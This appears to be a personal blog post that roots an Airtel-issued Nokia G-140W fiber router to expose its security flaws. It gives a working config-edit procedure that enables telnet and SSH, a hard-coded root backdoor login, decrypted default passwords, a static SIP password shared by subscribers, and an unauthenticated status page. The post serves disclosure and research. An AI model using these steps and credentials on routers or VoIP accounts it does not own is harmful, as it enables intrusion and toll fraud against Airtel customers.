---
layout: post
title: A deep dive into Airtel GPON router by rooting it.
tags: airtel privacy router
excerpt: The router has a 4 year firmware, hidden backdoors, uses no encryption and various static passwords.
image: 
  path: https://5.imimg.com/data5/PA/JH/QZ/ANDROID-97514658/product-jpeg-500x500.jpg
  height: 250
  width: 250
---
# Airtel GPON Router
If you had recently upgraded your broadband connection to Fiber from DSL, Airtel would have
given a router which looks like this: 
![Nokia G-140W](https://5.imimg.com/data5/PA/JH/QZ/ANDROID-97514658/product-jpeg-500x500.jpg)

The first screen that comes up, after it is set-up by Airtel technicians, looks like this:
![Status Page](/public/images/gpon-router.jpg)

This is a very old firmware (4 years+), which is a red flag by itself, as it allows anyone who gets into your WiFi 
network, by trying out default credentials to root the router and establish a permanent presence in the network.

# Enabling root access
By default, the router does not allow a root shell, but a quick scan for this device leads us to the following links: 
1. [Nokia GPON ONT, multiple vulnerabilities](https://www.tenable.com/security/research/tra-2019-09)
2. [Backup restore script for Nokia GPON](https://gist.github.com/thedroidgeek/80c379aa43b71015d71da130f85a435a)

CVE-2019-3918 shows that there are 4 hidden backdoors available in the GPON ONT that can be exploited and Tenable 
says that Nokia has already informed affected customers. So how do we check if the shipped device still has these 
backdoors? This is where the Backup/Restore script comes in handy.

The GPON Router allows the router configuration to be exported as a ".config" file via Maintenance->Backup and restore -> Export file
option. We can then use the following commands to unpack it. 
```bash
$ file ./config.cfg
 config.cfg: data

$ ./nokia-route-cfg-tool.py -u config.cfg 
 big endian CPU detected
 fw_magic = 0x44180198
 unpacked as: config-26122020-####.xml

 # repack with:
 ./nokia-route-cfg-tool.py -pb config-26122020-####.xml 0x44180198

$ xmllint --format config-26122020-###.xml > formatted-config.xml 
```

The XML file can now be edited by hand to change the configuration and upload it. First We need to enable ONTUSER to 
login, by changing the false value to true.
```bash
 $ grep ONTUSER formatted-config.xml 
      <LimitAccount_ONTUSER rw="RW" t="boolean" v="false"/>
```

Telnet and SSH should then be enabled for local users, by the XML fragment below by changing TelnetDisabled and SshDisabled to "false"
```xml
<X_ALU-COM_LanAccessCfg. n="LanAccessCfg" t="staticObject">
    <HttpDisabled dv="false" rw="RW" t="boolean" v="false"/>
    <TelnetDisabled dv="false" rw="RW" t="boolean" v="false"/>
    <IcmpEchoReqDisabled dv="false" rw="RW" t="boolean" v="false"/>
    <SshDisabled dv="true" rw="RW" t="boolean" v="false"/>
    <HttpsDisabled dv="false" rw="RW" t="boolean" v="false"/>
    <Tr69Disabled dv="true" rw="RW" t="boolean" v="true"/>
    <SftpDisabled dv="true" rw="R" t="boolean" v="true"/>
  </X_ALU-COM_LanAccessCfg.>
```
Telnet and SSH services should also be then enabled in the services section, by editing the TelnetEnable and SshEnable sections.
```xml
<X_CT-COM_ServiceManage. n="CT_ServiceManage" t="staticObject">
      <FtpEnable rw="RW" t="boolean" v="false"/>
      <FtpRemoteAccessEnable rw="RW" t="boolean" v="false"/>
      <FtpUserName ml="256" rw="RW" t="string" v="ftpadmin"/>
      <FtpPassword ml="256" rw="RW" t="string" v="6Aj5nAPDhiOio7tp9JCrPA==" ealgo="ab"/>
      <FtpPort max="65535" min="0" rw="RW" t="int" v="21"/>
      <SftpEnable rw="RW" t="boolean" v="false"/>
      <SftpRemoteAccessEnable rw="RW" t="boolean" v="false"/>
      <SftpUserName ml="256" rw="RW" t="string" v="sftpadmin"/>
      <SftpPassword ml="256" rw="RW" t="string" v="" ealgo="ab"/>
      <SambaEnable rw="RW" t="boolean" v="false"/>
      <SambaUserName ml="256" rw="RW" t="string" v="samba"/>
      <SambaPassword ml="256" rw="RW" t="string" v="" ealgo="ab"/>
      <SambaWorkGroup ml="256" rw="RW" t="string" v="WORKGROUP"/>
      <UsbPrinterEnable rw="RW" t="boolean" v="false"/>
      <UsbPrinterUserName ml="256" rw="RW" t="string" v="myprinter"/>
      <UsbPrinterPassword ml="256" rw="RW" t="string" v="" ealgo="ab"/>
      <TelnetEnable rw="RW" t="boolean" v="true"/>
      <TelnetUserName ml="256" rw="RW" t="string" v="admin"/>
      <TelnetPassword ml="256" rw="RW" t="string" v="OYdLWUVDdKQTPaCIeTqniA==" ealgo="ab"/>
      <TelnetPort dv="23" max="65535" min="0" rw="RW" t="int" v="23"/>
      <FactoryTelnetEnable rw="RW" t="boolean" v="false"/>
      <SshEnable rw="RW" t="boolean" v="true"/>
      <SshPort dv="22" max="65535" min="0" rw="RW" t="int" v="22"/>
</X_CT-COM_ServiceManage.>
```
The edited file can now be repacked using the same tool. 
```bash
 $ ./nokia-route-cfg-tool.py -pb formatted-config.xml 0x44180198
  packed as: config-26122020-####.cfg
```

Now it can be imported into the GPON router using Maintenance->Backup and Restore -> Choose File -> Import option. The 
router will reboot immediately after the import. 

Telnet access as root is now available as ONTUSER:SUGAR2A041.
```bash
 $ telnet 192.168.1.1
 Trying 192.168.1.1...
 Escape character is '^]'.
 ### login #### 
 AONT login: ONTUSER
 Password: 
 [root@AONT: ONTUSER]# whoami
 root
 [root@AONT: ONTUSER]# id
 uid=0(root) gid=0(root) groups=0(root),10(wheel)
```

## Plenty of default passwords and backdoors

The unpacked XML file has quite a bit of these lines, which are encrypted passwords for various user accounts. They 
can be easily broken via the nokia-route-cfg-tool.py tool as shown below: 
```xml
<TelnetPassword ml="256" rw="RW" t="string" v="OYdLWUVDdKQTPaCIeTqniA==" ealgo="ab"/>
```
```bash
 $ ./nokia-route-cfg-tool.py -d OYdLWUVDdKQTPaCIeTqniA==
 decrypted: admin
```

There are close to 100+ such default passwords for various services, which can be decrypted using the same approach. 
```bash
$ grep ealgo formatted-config.xml | grep -v 'v=""' | wc -l
     104
```

## What does rooting teach us
The process list shows us, how the router does it's work. For instance, 
1. The router UI is served via the [thttpd daemon](https://en.wikipedia.org/wiki/Thttpd) and picks up all it's files from /webs folder.
2. SSH is implemented by [Dropbear server](https://matt.ucc.asn.au/dropbear/dropbear.html).
3. PPPoE is done via the standard pppd and the PPPoE passwords are available at /etc/ppp/options_ppp111 file.
4. TR-069 configuration is hard-coded at /configs/tr069_conf/
5. How Airtel's VoIP service works and the credentials. 
6. The build process and various vulnerabilities.
```bash
$ ps
1205 root      1620 S    /sbin/msgmgr
 1220 root      164m S    ./voip
 1229 appServi  1516 S    /webs/thttpd -u appService -dd /webs
 1230 root      1964 S    /sbin/diagnosis
 1231 root      2588 S    /sbin/ndbus_observer start
 1250 root      3048 S    /sbin/klogd
 1252 root      1488 S    /usr/exe/daemon
 1288 root      5760 S    /usr/sbin/vtysh -c
 1308 root      6360 S    /sbin/wifihostd
 1319 root      7008 S    /sbin/ndk_wand
 1321 root      2916 S    dbus-daemon --system --fork
 1322 root      2160 S    ndk_timer
 1327 root      9688 S    /sbin/rgwd
 1404 root     37688 S    /sbin/cfgmgr
 1470 root      4116 S    /sbin/ramond
 1472 root      1944 S    /sbin/sched
 1488 root      6760 S    /sbin/evtmgr
 1491 root     29516 S    /sbin/uplinkmgr
 1501 root      4092 S    /sbin/portmgr
 1535 root     13840 S N  /sbin/cfmmgr
 1605 root     40636 S    /sbin/parser
 1668 root      100m S    /sbin/omciMgr
 1965 root      3188 S    udhcpd /etc/udhcpd.conf
 1974 root      2708 S    /sbin/dnsproxy -D Home -v 0 -f 0x7 -g -p 0
 2254 root      2056 S    /usr/sbin/dropbear -r /configs/dropbear/dropbear_dss
 2286 root      1980 S    dhcp6s -f -c /etc/dhcp6s.conf br0
 2545 root         0 SW   [kworker/0:2]
 2730 root         0 SW   [RtmpCmdQTask]
 2731 root         0 SW   [RtmpWscTask]
 2734 root         0 SW   [RtmpMlmeTask]
 2766 root      3052 S    /sbin/syslogd -l 7 -s 1024 -b 2 -f /tmp/syslog.conf
 2774 root     11388 S    /sbin/ups
 2822 root         0 SW   [RtmpCmdQTask]
 2823 root         0 SW   [RtmpWscTask]
 2824 root         0 SW   [RtmpMlmeTask]
 2827 root      6572 S    /sbin/wanlived
 2859 root      3060 S    crond -b
 2878 root     12116 S    stunnel /usr/configs/stunnel.conf
 2991 root      1648 S    utelnetd -p 23 -t 300
 3345 root     25584 S    sec_daemon
 3354 root      3128 S    detect -c /configs/cfg.signed -w300 -t900 -i5 -S
 3413 root      3100 S    lanhostd -m 0 -f 0 -t 0
 5406 root      2188 S    pppd pon_100_0_1 file /etc/ppp/options_ppp111 unit 1
 5618 root      7808 S    /sbin/tr -d /configs/tr069_conf/
28673 root         0 SW   [kworker/u4:2]
29593 root         0 SW   [kworker/u4:0]
```

### The GPON Web server
The /webs directory, has a lot of CGI files which indicate that the Nokia Firmware is heavily customized. For instance, 
we can find the /webs/airtel.cgi and the GPON router shows this page separately from the GUI. 
```bash
$ root@AONT: /webs]# ls ./airtel.cgi 
./airtel.cgi
```
And then there are close to 150+ CGI scripts, but most of them are disabled, such as
1. Call Log management app 
2. VoIP manager app. 
3. LTE Management. 
4. LED Controllers. 
5. Internet TV Settings app. 

Just running them through the web-browser, we stumble upon a find. The airtel.cgi script is callable without needing
a password. Most likely this is used by Airtel support to check device status:
```bash
$ curl  192.168.1.1/airtel.cgi  | grep -i mode
"ModelName":"G-140W-F",
"ModemFirmwareVersion":"",
DuplexMode:'',
ConnectionMode:'VlanMuxMode',
FECMode:0,
LightSingnalMode:1,
```

## TR069 Configuration
TR069 is a configuration standard that allows service providers to configure equipments in customer environments. The
standard involves the device pinging back a auto-configuration server (ACS) for diagnostics when certain events happen. 
In this case, the TR-69 configuration is available at /configs/tr069_conf/ folder. 
```text
#TCPAddress = 0.0.0.0
TCPAddress = :: #or IPv6_Addr
TCPChallenge = Digest
TCPNotifyInterval = 0
#CLIAddress = 0.0.0.0
CLIAddress = 127.0.0.1
CLIPort = 1234
CLITimeout = 10
CACert = /configs/tr069_conf/ca-cert.pem
SysLogUploadCert = /configs/tr069_conf/SysLogUploadCert.pem
#ClientCert = /configs/tr069_conf/client.crt
#ClientKey = /configs/tr069_conf/client.key
#SSLPassword= password
Init = tr.xml # or tr.db: for linux/unix
#At the moment, all statis inform parameter MUST be constant value parameter
InformParameter = InternetGatewayDevice.DeviceSummary
InformParameter = InternetGatewayDevice.DeviceInfo.SpecVersion
InformParameter = InternetGatewayDevice.DeviceInfo.HardwareVersion
InformParameter = InternetGatewayDevice.DeviceInfo.SoftwareVersion
InformParameter = InternetGatewayDevice.DeviceInfo.ProvisioningCode
InformParameter = InternetGatewayDevice.ManagementServer.ConnectionRequestURL
InformParameter = InternetGatewayDevice.ManagementServer.ParameterKey
InformParameter = InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1.ExternalIPAddress
LogFileName = /logs/tr.log
LogAutoRotate = true
LogBackup = 5
LogLevel = NOTICE
LogMode = SCREEN
LogLimit = 128KB
Upload = 1 Vendor Configuration File:/tmp/upload_config.cfg
Upload = 2 Vendor Log File:/tmp/log.log
Upload = X ALU SysLog File:/tmp/syslog
Download = 1 Firmware Upgrade Image:/tmp/firmware.bin
Download = 2 Web Content:/tmp/web.html
Download = 3 Vendor Configuration File:/tmp/download_config.cfg
TrustTargetFileName = false
CustomedEvent = 1: X CT-COM ACCOUNTCHANGE
CustomedEvent = 2: X CT-COM BIND
CustomedEvent = 3: X CT-COM ALARM
CustomedEvent = 4: X CT-COM CLEARALARM
CustomedEvent = 5: X CT-COM MONITOR
CustomedEvent = 6: X CT-COM NAME CHANGE
CustomedEvent = 7: X CT-COM BIND1
CustomedEvent = 8: X CT-COM BIND2
CustomedEvent = 9: X CT-COM STBBIND
CustomedEvent = 10: X CT-COM CARDNOTIFY
CustomedEvent = 11: X CT-COM CARDWRITE
CustomedEvent = 12: X CT-COM LONGRESET
SessionTimeout = 60
```
Notice the weird absence of PEM files in the folder? Does that mean the Router is talking to Airtel via http? Let us
find out by looking at the configuration file, to see if it is possible to find out the Management Server. 
```xml
<ManagementServer. n="ManagementServer" t="staticObject">
    <EnableCWMP rw="RW" t="boolean" v="True"/>
    <CTMgtIPAddress ml="256" rw="R" t="string" v="122.181.215.2"/>
    <InternetPvc ml="256" rw="R" t="string" v="NULL"/>
    <MgtDNS ml="256" rw="R" t="string" v="125.22.47.125"/>
    <URL ml="256" rw="RW" t="string" v="Http://tms.airtelbroadband.in:8103"/>
...
</ManagementServer.>
```
Is this a TR069 ACS Server? Let us investigate using curl. 
```bash
$ curl -vvv http://tms.airtelbroadband.in:8103
*   Trying 125.19.17.48...
* TCP_NODELAY set
* Connected to tms.airtelbroadband.in (125.19.17.48) port 8103 (#0)
> GET / HTTP/1.1
> Host: tms.airtelbroadband.in:8103
> User-Agent: curl/7.64.1
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< WWW-Authenticate: Digest realm="CPEDigestLogin", qop="auth", nonce="150b4153-fa7c-4022-901c-e42857c6743e", opaque="145074cc9f9b8670f412d297d1d11274"
< X-Powered-By: Undertow/1
< Set-Cookie: JSESSIONID=oia8O6RQVz9xhoFWe68uBdEwpdHM-X7xXr3oQbmq.N1PTML-ACSA0013; path=/
< Server: WildFly/8
< Content-Type: text/html;charset=UTF-8
< Content-Length: 71
< Date: Sat, 26 Dec 2020 13:12:39 GMT
< 
* Connection #0 to host tms.airtelbroadband.in left intact
<html><head><title>Error</title></head><body>Unauthorized</body></html>* Closing connection 0
```

This definitely looks like a ACS Server, running on WildFly and asking for a CPEDigestLogin, but all CPEs are talking to
it via Http (ugh..)

## VoIP configuration
A look at /configs/alcatel/config/V45_0.xml.xmld reveals that Airtel landlines connected to the GPON Router, uses VoIP
servers as shown below: 
```xml
<SIPProtocolDataSet>
    <RegistrarURI >sip:ims.airtel.in</RegistrarURI>
    <RegistrarRoute >10.232.139.146</RegistrarRoute>
    <OutboundProxy >10.232.139.146</OutboundProxy>
    <TransportProtocol >
        <name >UDP</name>
        <port >5060</port>
    </TransportProtocol>
    <register_period >3600</register_period>
    <register_head_start >60</register_head_start>
    <register_retry_interval >60</register_retry_interval>
    <sip_dscp >0</sip_dscp>
    <subscribe_period >86400</subscribe_period>
    <subscribe_head_start >3600</subscribe_head_start>
    <sip_timer_t1 >500</sip_timer_t1>
    <sip_timer_t2 >4</sip_timer_t2>
    <sip_invite_timeout >32</sip_invite_timeout>
    <sip_noninvite_timeout >32</sip_noninvite_timeout>
    <peer_codec_commit >always</peer_codec_commit>
    <add_route_header >True</add_route_header>
    <follow_registration >False</follow_registration>
    <call_waiting_ringing_indication >180</call_waiting_ringing_indication>
</SIPProtocolDataSet>
```

The Identity data which allows third party SIP clients to function as our landlines is also there, but with a 
static password for all subscribers (ugh!)
```xml
<IdentityDataSet>
    <AddressOfRecord >sip:+91-phone-number@ims.airtel.in</AddressOfRecord>
    <username >+91phone-number@ims.airtel.in</username>
    <Password >Huawei@1</Password>
    <ContactURIUser >phone-number</ContactURIUser>
</IdentityDataSet>
```

## Build Process
The Build process is done by image overlays from a base version and the firmware is never code signed (ugh...)
```bash
root@AONT: /configs]# cat image_version 
image0_version=3FE47150DGAB98
image1_version=3FE47150DGAB44

root@AONT: /configs]# cat image_version 
image0_version=3FE47150DGAB98
image1_version=3FE47150DGAB44
[root@AONT: /configs]# cat last_buildinfo_img0 
ONT_TYPE=g140wc
PON_MODE=GPON
SOFTWAREVERSION=DGA.B98p01
PRODUCTCLASS=g140wc
RELEASE=0.0.0
BUILDSTAMP=
BUILDDATE=20191204_1030
COPYRIGHT=ASB
WHOBUILD=buildmgr
IMAGEVERSION=3FE47150DGAB98
VOIP=sip
CONFIG_VOIP_SW=
LATEST_REV=55716
REPO=sw   
SIGN=n    <------- (My addition)
CVP_REVISION=3d58ea3594f91a6b91a25ed4c0017b754f08d4b3
```

# Conclusion
The only logical conclusion, that one can arrive it after looking at this device from a security stand point, is to 
get a better replacement. However service providers, exercise a lot of control on GPON devices using TR-069 standard, 
that makes it very difficult to throw these away. Given that the pandemic has compressed office spaces into our homes, 
having a good broadband connection, which is secure by default is essential, even if those devices cost a bit more and
introduce a management overhead.

